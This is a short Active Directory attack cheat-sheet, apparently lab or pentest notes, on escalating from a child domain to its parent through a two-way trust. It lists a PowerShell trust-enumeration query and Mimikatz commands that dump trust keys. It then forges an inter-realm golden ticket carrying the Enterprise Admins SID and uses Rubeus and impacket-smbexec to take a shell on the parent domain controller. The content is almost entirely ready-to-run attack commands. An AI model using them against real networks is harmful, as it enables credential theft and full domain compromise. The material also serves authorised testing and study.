# Exploit Child Domain Trust

From : https://github.com/WiredPulse/PowerShell/blob/master/Active_Directory/Get-DomainTrusts.ps1

```powershell
.NOTES:
    UNDERSTANDING OUTPUT:
    TrustedAttributes = Direction of Trust
        1 = Non-Transitive
        2 = Transitive

    TrustedDirection = Direction of Trust
        1 = Incoming only
        2 = Outgoing only
        3 = Two-way
    

Get-WmiObject -Class Microsoft_DomainTrustStatus -Namespace ROOT\MicrosoftActiveDirectory | Select-Object PSComputername, TrustedDomain, TrustAttributes, TrustDirection, TrustType
```

## Mimikatz

```
mimikatz # privilege::debug
mimikatz # lsadump::trust /patch 
```

## Exploit with child domain -> parent domain

If trust by twoways, like `[  In ] DEV.ADMIN.OFFSHORE.COM -> ADMIN.OFFSHORE.COM` show on mimikatz, we can exploit it:

`519` is the `Enterprise Administrarors` Group.

```
mimikatz # kerberos::golden /domain:<current domain (sub.manesec.com)> /sid:<current SID> /sids:<target domain SID>-519 /rc4:<rc4_hmac_nt> /user:administrator /service:krbtgt /target:<target domain (manesec.com)>  /ticket:save.kirbi /ptt

.\Rubeus.exe asktgs /ticket:save.kirbi /service:CIFS/DC.MANESEC.COM /dc:MANESEC.COM /ptt /outfile:admin.kirbi

impacket-smbexec administrator@DC.MANESEC.COM -dc-ip 172.16.3.5 -k -no-pass -debug
```

## Reference

+ https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d
+ https://www.c0bra.xyz/2021/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F-SID-History%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E5%9F%9F%E4%BF%A1%E4%BB%BB%E6%94%BB%E5%87%BB/
